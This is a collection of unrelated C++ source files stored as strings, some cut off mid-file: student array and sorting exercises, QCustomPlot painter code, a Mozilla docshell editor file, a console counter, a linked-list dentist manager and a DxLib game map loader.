    "#include <iostream>\n#include \"Header.h\"\nusing namespace std;\nint main()\n{\n\t/*\n\tsrand(time(NULL));\n\tconst int size = 10;\n\tint arr[size]{};\n\tInitArray(arr, size);\n\tShowArray(arr, size);\n\tint choice;\n\tcout << \"1 - sortuvannya za zrostannyam\" << endl;\n\tcout << \"2 - sortuvannya za spadannyam\" << endl;\n\tcout << \"Enter your choice: \" << endl;\n\tcin >> choice;\n\tInsertSort(arr, size, choice - 1);\n\tShowArray(arr, size);\n\t*/\n\n\n\n\n\t/*\n\tsrand(time(NULL));\n\tconst int size = 20;\n\tint arr[size]{};\n\tInitArray2(arr, size);\n\tShowArray(arr, size);\n\tint minIndex, maxIndex;\n\tfor (minIndex = 0; minIndex < size; minIndex++) if (arr[minIndex] < 0) break;\n\tfor (maxIndex = size - 1; maxIndex > 0; maxIndex--) if (arr[maxIndex] < 0) break;\n\tInsertSortRange(arr, minIndex + 1, maxIndex - 1);\n\tShowArray(arr, size);\n\t*/\n\n\n\n\n\t/*\n\tsrand(time(NULL));\n\tconst int size = 20;\n\tint arr[size]{};\n\tInitArray3(arr, size);\n\tShowArray(arr, size);\n\tScatterElements(arr, size);\n\tShowArray(arr, size);\n\tint number;\n\tcout << \"Enter number in range (1-20): \";\n\tcin >> number;\n\tcout << \"Number \" << number << \" is at index \" << FindNumberIndex(arr, size, number) << endl;\n\t*/\n\n\n\n\n\t/*\n\tint number, pow;\n\tcout << \"Enter number: \";\n\tcin >> number;\n\tcout << \"Enter power of number: \";\n\tcin >> pow;\n\tcout << \"Power of number \" << number << \" --> \" << PowerOfNumber(number, pow) << endl;\n\t*/\n\n\n\n\n\t/*\n\tint N;\n\tcout << \"Enter count of stars: \";\n\tcin >> N;\n\tPrintStars(N, 1);\n\t*/\n\n\n\n\n\t/*\n\tint a, b;\n\tcout << \"Enter first number: \";\n\tcin >> a;\n\tcout << \"Enter second number: \";\n\tcin >> b;\n\tSumma(a, b);\n\t*/\n\n\n\n\n\t/*\n\tconst int size = 100;\n\tint arr[size]{};\n\tfor (int i = 0; i < size; i++) arr[i] = rand() % 999 + 1;\n\tShowArray(arr, size);\n\tcout << \"---------------------\" << endl;\n\tcout << \"Min summa in index \" << MinSummaIndex(arr, size - 9) << endl;\n\t*/\n}\n\nint MinSummaIndex(int arr[], int size)\n{\n\tint res = -1;\n\tint summaRes;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tint summa = 0;\n\t\tfor (int j = i; j < i + 10; j++)\n\t\t{\n\t\t\tsumma += arr[j];\n\t\t}\n\t\tif (res == -1) summaRes = summa, res = i;\n\t\telse if (summaRes > summa) summaRes = summa, res = i;\n\t}\n\treturn res;\n}\n\nvoid Summa(int a, int b)\n{\n\tint summa = a;\n\tcout << \"--------------------------\" << endl;\n\tcout << a;\n\tfor (int i = a + 1; i <= b; i++)\n\t{\n\t\tsumma += i;\n\t\tcout << \" + \" << i;\n\t}\n\tcout << \" = \" << summa << endl;\n}\n\nvoid PrintStars(int count, int counter)\n{\n\tcout << '*';\n\tif (counter < count) PrintStars(count, counter + 1);\n}\n\nint FindNumberIndex(int arr[], int size, int number)\n{\n\tfor (int i = 0; i < size; i++) if (arr[i] == number) return i;\n}\n\nvoid ScatterElements(int arr[], int size)\n{\n\tint counter = 0, temp;\n\twhile (counter <= 100) {\n\t\tint firstElement = 0, secondElement = 0;\n\t\tcounter++;\n\t\twhile (firstElement == secondElement) firstElement = rand() % size, secondElement = rand() % size;\n\t\ttemp = arr[firstElement], arr[firstElement] = arr[secondElement], arr[secondElement] = temp;\n\t}\n}\n\nvoid ShowArray(int* parr, int size)\n{\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << *(parr + i) << ' ';\n\t}\n\tcout << endl;\n}\n\nvoid InitArray(int* parr, int size)\n{\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t*(parr + i) = rand() % 90 + 10;\n\t}\n}\n\nvoid InitArray2(int* parr, int size)\n{\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t*(parr + i) = rand() % 41 - 20;\n\t}\n}\n\nvoid InitArray3(int* parr, int size)\n{\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t*(parr + i) = i + 1;\n\t}\n}\n\nvoid InsertSort(int arr[], int size, int value)\n{\n\tif (value != 1 && value != 0) value = 1;\n\tif (value == 0)\n\t{\n\t\tint temp;\n\t\tint j;\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\ttemp = arr[i];\n\t\t\tfor (j = i - 1; j >= 0 && arr[j] > temp; j--)\n\t\t\t{\n\t\t\t\tarr[j + 1] = arr[j];\n\t\t\t}\n\t\t\tarr[j + 1] = temp;\n\t\t}\n\t}\n\telse if (value == 1)\n\t{\n\t\tint temp;\n\t\tint j;\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\ttemp = arr[i];\n\t\t\tfor (j = i - 1; j >= 0 && arr[j] < temp; j--)\n\t\t\t{\n\t\t\t\tarr[j + 1] = arr[j];\n\t\t\t}\n\t\t\tarr[j + 1] = temp;\n\t\t}\n\t}\n}\n\nvoid InsertSortRange(int arr[], int start, int end)\n{\n\tint temp;\n\tint j;\n\tfor (int i = start + 1; i <= end; i++)\n\t{\n\t\ttemp = arr[i];\n\t\tj = i - 1;\n\t\twhile (j >= start && arr[j] > temp)\n\t\t{\n\t\t\tarr[j + 1] = arr[j];\n\t\t\tj--;\n\t\t}\n\t\tarr[j + 1] = temp;\n\t}\n}\n\nint PowerOfNumber(int number, int pow)\n{\n\tpow--;\n\tif (pow == 0) return number;\n\treturn number * PowerOfNumber(number, pow);\n}",
    "/***************************************************************************\n**                                                                        **\n**  QCustomPlot, an easy to use, modern plotting widget for Qt            **\n**  Copyright (C) 2011-2015 Emanuel Eichhammer                            **\n**                                                                        **\n**  This program is free software: you can redistribute it and/or modify  **\n**  it under the terms of the GNU General Public License as published by  **\n**  the Free Software Foundation, either version 3 of the License, or     **\n**  (at your option) any later version.                                   **\n**                                                                        **\n**  This program is distributed in the hope that it will be useful,       **\n**  but WITHOUT ANY WARRANTY; without even the implied warranty of        **\n**  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         **\n**  GNU General Public License for more details.                          **\n**                                                                        **\n**  You should have received a copy of the GNU General Public License     **\n**  along with this program.  If not, see http://www.gnu.org/licenses/.   **\n**                                                                        **\n****************************************************************************\n**           Author: Emanuel Eichhammer                                   **\n**  Website/Contact: http://www.qcustomplot.com/                          **\n**             Date: 25.04.15                                             **\n**          Version: 1.3.1                                                **\n****************************************************************************/\n\n#include \"qcustomplot.h\"\n#include <QToolTip>\n\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\n//////////////////// QCPPainter\n////////////////////////////////////////////////////////////////////////////////////////////////////\n\n/*! \\class QCPPainter\n  \\brief QPainter subclass used internally\n  \n  This QPainter subclass is used to provide some extended functionality e.g. for tweaking position\n  consistency between antialiased and non-antialiased painting. Further it provides workarounds\n  for QPainter quirks.\n  \n  \\warning This class intentionally hides non-virtual functions of QPainter, e.g. setPen, save and\n  restore. So while it is possible to pass a QCPPainter instance to a function that expects a\n  QPainter pointer, some of the workarounds and tweaks will be unavailable to the function (because\n  it will call the base class implementations of the functions actually hidden by QCPPainter).\n*/\n\n/*!\n  Creates a new QCPPainter instance and sets default values\n*/\nQCPPainter::QCPPainter() :\n    QPainter(),\n    mModes(pmDefault),\n    mIsAntialiasing(false)\n{\n    // don't setRenderHint(QPainter::NonCosmeticDefautPen) here, because painter isn't active yet and\n    // a call to begin() will follow\n}\n\n/*!\n  Creates a new QCPPainter instance on the specified paint \\a device and sets default values. Just\n  like the analogous QPainter constructor, begins painting on \\a device immediately.\n  \n  Like \\ref begin, this method sets QPainter::NonCosmeticDefaultPen in Qt versions before Qt5.\n*/\nQCPPainter::QCPPainter(QPaintDevice *device) :\n    QPainter(device),\n    mModes(pmDefault),\n    mIsAntialiasing(false)\n{\n#if QT_VERSION < QT_VERSION_CHECK(5, 0, 0) // before Qt5, default pens used to be cosmetic if NonCosmeticDefaultPen flag isn't set. So we set it to get consistency across Qt versions.\n    if (isActive())\n        setRenderHint(QPainter::NonCosmeticDefaultPen);\n#endif\n}\n\nQCPPainter::~QCPPainter()\n{\n}\n\n/*!\n  Sets the pen of the painter and applies certain fixes to it, depending on the mode of this\n  QCPPainter.\n  \n  \\note this function hides the non-virtual base class implementation.\n*/\nvoid QCPPainter::setPen(const QPen &pen)\n{\n    QPainter::setPen(pen);\n    if (mModes.testFlag(pmNonCosmetic))\n        makeNonCosmetic();\n}\n\n/*! \\overload\n  \n  Sets the pen (by color) of the painter and applies certain fixes to it, depending on the mode of\n  this QCPPainter.\n  \n  \\note this function hides the non-virtual base class implementation.\n*/\nvoid QCPPainter::setPen(const QColor &color)\n{\n    QPainter::setPen(color);\n    if (mModes.testFlag(pmNonCosmetic))\n        makeNonCosmetic();\n}\n\n/*! \\overload\n  \n  Sets the pen (by style) of the painter and applies certain fixes to it, depending on the mode of\n  this QCPPainter.\n  \n  \\note this function hides the non-virtual base class implementation.\n*/\nvoid QCPPainter::setPen(Qt::PenStyle penStyle)\n{\n    QPainter::setPen(penStyle);\n    if (mModes.testFlag(pmNonCosmetic))\n        makeNonCosmetic();\n}\n\n/*! \\overload\n  \n  Works around a Qt bug introduced with Qt 4.8 which makes drawing QLineF unpredictable when\n  antialiasin",
    "/* -*- Mode: C++; tab-width: 8; indent-tabs-mode: nil; c-basic-offset: 2 -*- */\n/* vim: set ts=8 sts=2 et sw=2 tw=80: */\n/* This Source Code Form is subject to the terms of the Mozilla Public\n * License, v. 2.0. If a copy of the MPL was not distributed with this\n * file, You can obtain one at http://mozilla.org/MPL/2.0/. */\n\n#include \"nsDocShellEditorData.h\"\n#include \"nsIInterfaceRequestorUtils.h\"\n#include \"nsComponentManagerUtils.h\"\n#include \"nsPIDOMWindow.h\"\n#include \"nsIDOMDocument.h\"\n#include \"nsIEditor.h\"\n#include \"nsIEditingSession.h\"\n#include \"nsIDocShell.h\"\n\nnsDocShellEditorData::nsDocShellEditorData(nsIDocShell* aOwningDocShell)\n  : mDocShell(aOwningDocShell)\n  , mMakeEditable(false)\n  , mIsDetached(false)\n  , mDetachedMakeEditable(false)\n  , mDetachedEditingState(nsIHTMLDocument::eOff)\n{\n  NS_ASSERTION(mDocShell, \"Where is my docShell?\");\n}\n\nnsDocShellEditorData::~nsDocShellEditorData()\n{\n  TearDownEditor();\n}\n\nvoid\nnsDocShellEditorData::TearDownEditor()\n{\n  if (mEditor) {\n    mEditor->PreDestroy(false);\n    mEditor = nullptr;\n  }\n  mEditingSession = nullptr;\n  mIsDetached = false;\n}\n\nnsresult\nnsDocShellEditorData::MakeEditable(bool aInWaitForUriLoad)\n{\n  if (mMakeEditable) {\n    return NS_OK;\n  }\n\n  // if we are already editable, and are getting turned off,\n  // nuke the editor.\n  if (mEditor) {\n    NS_WARNING(\"Destroying existing editor on frame\");\n\n    mEditor->PreDestroy(false);\n    mEditor = nullptr;\n  }\n\n  if (aInWaitForUriLoad) {\n    mMakeEditable = true;\n  }\n  return NS_OK;\n}\n\nbool\nnsDocShellEditorData::GetEditable()\n{\n  return mMakeEditable || (mEditor != nullptr);\n}\n\nnsresult\nnsDocShellEditorData::CreateEditor()\n{\n  nsCOMPtr<nsIEditingSession> editingSession;\n  nsresult rv = GetEditingSession(getter_AddRefs(editingSession));\n  if (NS_FAILED(rv)) {\n    return rv;\n  }\n\n  nsCOMPtr<nsIDOMWindow> domWindow =\n    mDocShell ? mDocShell->GetWindow() : nullptr;\n  rv = editingSession->SetupEditorOnWindow(domWindow);\n  if (NS_FAILED(rv)) {\n    return rv;\n  }\n\n  return NS_OK;\n}\n\nnsresult\nnsDocShellEditorData::GetEditingSession(nsIEditingSession** aResult)\n{\n  nsresult rv = EnsureEditingSession();\n  NS_ENSURE_SUCCESS(rv, rv);\n\n  NS_ADDREF(*aResult = mEditingSession);\n\n  return NS_OK;\n}\n\nnsresult\nnsDocShellEditorData::GetEditor(nsIEditor** aResult)\n{\n  NS_ENSURE_ARG_POINTER(aResult);\n  NS_IF_ADDREF(*aResult = mEditor);\n  return NS_OK;\n}\n\nnsresult\nnsDocShellEditorData::SetEditor(nsIEditor* aEditor)\n{\n  // destroy any editor that we have. Checks for equality are\n  // necessary to ensure that assigment into the nsCOMPtr does\n  // not temporarily reduce the refCount of the editor to zero\n  if (mEditor.get() != aEditor) {\n    if (mEditor) {\n      mEditor->PreDestroy(false);\n      mEditor = nullptr;\n    }\n\n    mEditor = aEditor;  // owning addref\n    if (!mEditor) {\n      mMakeEditable = false;\n    }\n  }\n\n  return NS_OK;\n}\n\n// This creates the editing session on the content docShell that owns 'this'.\nnsresult\nnsDocShellEditorData::EnsureEditingSession()\n{\n  NS_ASSERTION(mDocShell, \"Should have docShell here\");\n  NS_ASSERTION(!mIsDetached, \"This will stomp editing session!\");\n\n  nsresult rv = NS_OK;\n\n  if (!mEditingSession) {\n    mEditingSession =\n      do_CreateInstance(\"@mozilla.org/editor/editingsession;1\", &rv);\n  }\n\n  return rv;\n}\n\nnsresult\nnsDocShellEditorData::DetachFromWindow()\n{\n  NS_ASSERTION(mEditingSession,\n               \"Can't detach when we don't have a session to detach!\");\n\n  nsCOMPtr<nsIDOMWindow> domWindow =\n    mDocShell ? mDocShell->GetWindow() : nullptr;\n  nsresult rv = mEditingSession->DetachFromWindow(domWindow);\n  NS_ENSURE_SUCCESS(rv, rv);\n\n  mIsDetached = true;\n  mDetachedMakeEditable = mMakeEditable;\n  mMakeEditable = false;\n\n  nsCOMPtr<nsIDOMDocument> domDoc;\n  domWindow->GetDocument(getter_AddRefs(domDoc));\n  nsCOMPtr<nsIHTMLDocument> htmlDoc = do_QueryInterface(domDoc);\n  if (htmlDoc) {\n    mDetachedEditingState = htmlDoc->GetEditingState();\n  }\n\n  mDocShell = nullptr;\n\n  return NS_OK;\n}\n\nnsresult\nnsDocShellEditorData::ReattachToWindow(nsIDocShell* aDocShell)\n{\n  mDocShell = aDocShell;\n\n  nsCOMPtr<nsIDOMWindow> domWindow =\n    mDocShell ? mDocShell->GetWindow() : nullptr;\n  nsresult rv = mEditingSession->ReattachToWindow(domWindow);\n  NS_ENSURE_SUCCESS(rv, rv);\n\n  mIsDetached = false;\n  mMakeEditable = mDetachedMakeEditable;\n\n  nsCOMPtr<nsIDOMDocument> domDoc;\n  domWindow->GetDocument(getter_AddRefs(domDoc));\n  nsCOMPtr<nsIHTMLDocument> htmlDoc = do_QueryInterface(domDoc);\n  if (htmlDoc) {\n    htmlDoc->SetEditingState(mDetachedEditingState);\n  }\n\n  return NS_OK;\n}\n",
    "\ufeff#include <iostream>\n#include <cstring>\n#include <windows.h>\n\nclass Counter\n{\nprivate:\n    int a = 1;\n\npublic:\n    Counter(int n)\n    {\n        this->a = n;\n    }\n    int getCounter()\n    {\n        return a;\n    }\n    int counterPlus()\n    {\n        return a++;\n    }\n    int counterMinus()\n    {\n        return a--;\n    }\n};\n\nint main()\n{\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n    std::string s;\n    int n = 1;\n    bool true_s = false;\n    do\n    {\n        std::cout << std::endl << \"\u0412\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0443\u043a\u0430\u0437\u0430\u0442\u044c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0441\u0447\u0451\u0442\u0447\u0438\u043a\u0430? \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430 \u0438\u043b\u0438 \u043d\u0435\u0442: \";\n        std::cin >> s;\n        std::cout << std::endl;\n\n        if (s == \"\u0434\u0430\" || s == \"\u0414\u0430\")\n        {\n            std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0441\u0447\u0451\u0442\u0447\u0438\u043a\u0430: \";\n            std::cin >> n;\n            true_s = true;\n        }\n        else if (s == \"\u043d\u0435\u0442\" || s == \"\u041d\u0435\u0442\")\n        {\n            true_s = true;\n        }\n        else\n        {\n            std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u0432\u0435\u0440\u043d\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443.\";\n        }\n    } while (!true_s);\n    Counter Counter(n);\n    std::cout << std::endl;\n    std::string command;\n    bool commandlog = false;\n    do\n    {\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u0443 ('+', '-', '=' \u0438\u043b\u0438 'x'): \";\n        std::cin >> command;\n\n        if (command == \"x\")\n        {\n            std::cout << \"\u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\";\n            commandlog = true;\n        }\n        else if (command == \"+\")\n        {\n            Counter.counterPlus();\n        }\n        else if (command == \"-\")\n        {\n            Counter.counterMinus();\n        }\n        else if (command == \"=\")\n        {\n            std::cout << Counter.getCounter() << std::endl;\n        }\n        else\n        {\n            std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u0432\u0435\u0440\u043d\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443.\" << std::endl;\n        }\n    } while (!commandlog);\n    return 0;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\n// Struct NhaSy\r\nstruct NhaSy {\r\n    int id;\r\n    string ten;\r\n    unsigned int tuoi;\r\n    string chucdanh;\r\n    bool TT;\r\n    NhaSy* next;\r\n};\r\ntypedef NhaSy* N;\r\ntypedef NhaSy* ListN;\r\n\r\n// Khoi tao danh sach nha sy rong\r\nvoid InitializeN(ListN& A) {\r\n    A = NULL;\r\n}\r\n\r\n// Template ham hoan doi gia tri\r\ntemplate <class T>\r\nvoid Swap(T& a, T& b) {\r\n    T temp = a;\r\n    a = b;\r\n    b = temp;\r\n}\r\n\r\n// Ham them nha sy\r\nvoid InSertDentist(ListN& n) {\r\n    N a = new NhaSy;\r\n    cout << \"Nhap ten: \" ; getline(cin, a -> ten);\r\n    cout << \"Nhap ID: \"; cin >> a -> id;\r\n    cout << \"Nhap tuoi: \"; cin >> a -> tuoi; cin.ignore();\r\n    cout << \"Nhap chuc danh: \"; getline(cin, a -> chucdanh);\r\n    a -> TT = rand() % 2 == 0;\r\n    a -> next = NULL;\r\n    if (n == NULL) {\r\n        n = a;\r\n    } else {\r\n        N temp = n;\r\n        while (temp -> next != NULL) {\r\n            temp = temp -> next;\r\n        }\r\n        temp -> next = a;\r\n    }\r\n}\r\n\r\n// Ham xoa nha sy\r\nvoid DeleteDentist(ListN& n, int MaSo) {\r\n    if (n == NULL) {\r\n        cout << \"Danh sach rong!\" << endl;\r\n        return;\r\n    }\r\n    if (n -> id == MaSo) {\r\n        N temp = n;\r\n        n = n -> next;\r\n        delete temp;\r\n        return;\r\n    }\r\n    N current = n;\r\n    while (current -> next != NULL) {\r\n        if (current -> next -> id == MaSo) {\r\n            N temp = current -> next;\r\n            current -> next = current -> next -> next;\r\n            delete temp;\r\n            return;\r\n        }\r\n        current = current -> next;\r\n    }\r\n    cout << \"Khong tim thay nha sy voi ID: \" << MaSo << endl;\r\n}\r\n\r\n// Ham hien thi danh sach nha sy\r\nvoid DisplayDentist(ListN n) {\r\n    if (n == NULL) {\r\n        cout << \"Danh sach rong!\" << endl;\r\n        return;\r\n    }\r\n    while (n != NULL) {\r\n        cout << \"Ten: \" << n -> ten << endl;\r\n        cout << \"Tuoi: \" << n -> tuoi << endl;\r\n        cout << \"ID: \" << n -> id << endl;\r\n        cout << \"Chuc Danh: \" << n -> chucdanh << endl;\r\n        cout << \"Trang Thai: \" << (n -> TT ? \"dang ranh\" : \"dang ban\" ) << endl;\r\n        n = n -> next;\r\n    }\r\n}\r\n\r\n// Ham tim kiem nha sy theo ID\r\nvoid SearchDentist(ListN n, int MaSo) {\r\n    if (n == NULL) {\r\n        cout << \"Danh sach rong!\" << endl;\r\n        return;\r\n    }\r\n    N temp = n;\r\n    while (temp != NULL) {\r\n        if (temp -> id == MaSo) {\r\n            cout << \"Ten: \" << temp -> ten << endl;\r\n            cout << \"Tuoi: \" << temp -> tuoi << endl;\r\n            cout << \"ID: \" << temp -> id << endl;\r\n            cout << \"Chuc Danh: \" << temp -> chucdanh << endl;\r\n            cout << \"Trang Thai: \" << (temp -> TT ? \"dang ranh\" : \"dang ban\" ) << endl;\r\n            return;\r\n        }\r\n        temp = temp -> next;\r\n    }\r\n    cout << \"Khong tim thay nha sy voi ID: \" << MaSo << endl;\r\n}\r\n\r\n// Ham sua thong tin nha sy\r\nvoid UpdateDentist(ListN& n, int MaSo) {\r\n    if (n == NULL) {\r\n        cout << \"Danh sach rong!\" << endl;\r\n        return;\r\n    }\r\n    N temp = n;\r\n    while (temp != NULL) {\r\n        if (temp -> id == MaSo) {\r\n            cout << \"Nhap ten moi: \"; cin.ignore(); getline(cin, temp -> ten);\r\n            cout << \"Nhap ID moi: \"; cin >> temp -> id; cin.ignore();\r\n            cout << \"Nhap tuoi moi: \"; cin >> temp -> tuoi; cin.ignore();\r\n            cout << \"Nhap chuc danh moi: \"; getline(cin, temp -> chucdanh);\r\n            temp -> TT = rand() % 2 == 0;\r\n            return;\r\n        }\r\n        temp = temp -> next;\r\n    }\r\n    cout << \"Khong tim thay nha sy voi ID: \" << MaSo << endl;\r\n}\r\n\r\n// Ham sap xep danh sach nha sy theo ID tang dan\r\nvoid SortDentistbyID(ListN& n) {\r\n    if (n == NULL) {\r\n        cout << \"Danh sach rong!\" << endl;\r\n        return;\r\n    }\r\n\r\n    bool swapped;\r\n    do {\r\n        swapped = false;\r\n        N current = n;\r\n        while (current -> next != NULL) {\r\n            if (current -> id > current -> next -> id) {\r\n                Swap(current -> id, current -> next -> id);\r\n                Swap(current -> ten, current -> next -> ten);\r\n                Swap(current -> tuoi, current -> next -> tuoi);\r\n                Swap(current -> chucdanh, current -> next -> chucdanh);\r\n                Swap(current -> TT, current -> next -> TT);\r\n                swapped = true;\r\n            }\r\n            current = current -> next;\r\n        }\r\n    } while (swapped);\r\n}\r\n\r\nint main() {\r\n    srand(time(0)); // khoi tao time ngau nhien\r\n\r\n    ListN danhSachNhaSy;\r\n    InitializeN(danhSachNhaSy);\r\n\r\n    cout << \"Nhap thong tin cho 3 nha sy:\" << endl;\r\n    for (int i = 0; i < 3; ++i) {\r\n        InSertDentist(danhSachNhaSy);\r\n    }\r\n\r\n    cout << \"\\nDanh sach nha sy truoc khi sap xep:\" << endl;\r\n    DisplayDentist(danhSachNhaSy);\r\n\r\n    SortDentistbyID(danhSachNhaSy);\r\n\r\n    cout << \"\\nDanh sach nha sy sau khi sap xep theo ID tang dan:\" << endl;\r\n    DisplayDentist(danhSachNhaSy);\r\n\r\n    int searchID, updateID, deleteID;\r\n\r\n    cout << \"\\nNhap ID nha sy can tim: ",
    "\ufeff// 2023 Takeru Yui All Rights Reserved.\n#include<vector>\n#include \"Map.h\"\n#include \"DxLib.h\"\n#include \"WorldSprite.h\"\n\nconst int Map::Stage1Data[StageData1ColNum][StageData1RowNum] =\n{\n\t{65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65},\n\t{73,73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0,73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65},\n};\n\nconst int Map::Stage2Data[StageData2ColNum][StageData2RowNum] =\n{\n\t{65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65},\n\t{73,73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73, 0,73, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,65},\n\t{73,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65},\n};\n\nconst float Map::ChipSize = 0.725f;\nconst int Map::ChipPixelSize = 32;\n\n/// <summary>\n/// \u914d\u5217\u3078\u306e\u30dd\u30a4\u30f3\u30bf\u3092\u3082\u3089\u3063\u3066\u30d9\u30af\u30bf\u3092\u4f5c\u6210\u3059\u308b\n/// </summary>\nstd::vector<int> CreateArrayVector(const int targetData[], int num)\n{\n\tstd::vector<int> newVector;\n\tfor (int i = 0; i < num; i++)\n\t{\n\t\tnewVector.push_back(targetData[i]);\n\t}\n\treturn newVector;\n}\n\n/// <summary>\n/// \u30b3\u30f3\u30b9\u30c8\u30e9\u30af\u30bf\n/// </summary>\nMap::Map()\n\t: chipGraph(-1)\n{\n\tcurrentData.clear();\n}\n\n/// <summary>\n/// \u30c7\u30b9\u30c8\u30e9\u30af\u30bf\n/// </summary>\nMap::~Map()\n{\n\tfor (const auto& sprite : sprites)\n\t{\n\t\tif (sprite != nullptr)\n\t\t{\n\t\t\tdelete sprite;\n\t\t}\n\t}\n\tsprites.clear();\n}\n\n/// <summary>\n/// \u30ed\u30fc\u30c9\n/// </summary>\nvoid Map::Load(int stageNo)\n{\n\t// \u5916\u90e8\u304b\u3089\u306eint\u5024\u5165\u529b\u3067\u3001Stage1Data\u3092\u4f7f\u3046\u304bStage2Data\u3092\u4f7f\u3046\u304b\u5207\u308a\u66ff\u3048\u308b\n\tcurrentData.clear();\n\tswitch (stageNo)\n\t{\n\tcase 0:\n\t\tdataColNum = StageData1ColNum;\n\t\tdataRowNum = StageData1RowNum;\n\t\tfor (int i = 0; i < dataColNum; i++)\n\t\t{\n\t\t\tcurrentData.push_back(CreateArrayVector(Stage1Data[i], StageData1RowNum));\n\t\t}\n\t\tbreak;\n\tcase 1:\n\t\tdataColNum = StageData2ColNum;\n\t\tdataRowNum = StageData2RowNum;\n\t\tfor (int i = 0; i < dataColNum; i++)\n\t\t{\n\t\t\tcurrentData.push_back(CreateArrayVector(Stage2Data[i], StageData2RowNum));\n\t\t}\n\t\tbreak;\n\t}\n\n\t// \u3068\u308a\u3042\u3048\u305a\u30de\u30c3\u30d7\u30ed\u30fc\u30c9\n\tchipGraph = LoadGraph(\"data/texture/map/map.png\");\n\n\t// WorldSprite\u5b9f\u4f53\u8a2d\u5b9a\u3068\u4f4d\u7f6e\u521d\u671f\u5316\n\tVECTOR chipLeftTopPos = VGet(0, dataColNum * ChipSize, 0);\t\t\t// \u30de\u30c3\u30d7\u306e\u63cf\u753b\u958b\u59cb\u4f4d\u7f6e\uff08\u5de6\u4e0a\uff09\n\tfor (int i = 0; i < dataColNum; i++)\n\t{\n\t\tfor (int j = 0; j < dataRowNum; j++)\n\t\t{\n\t\t\tauto sprite = new WorldSprite();\t// 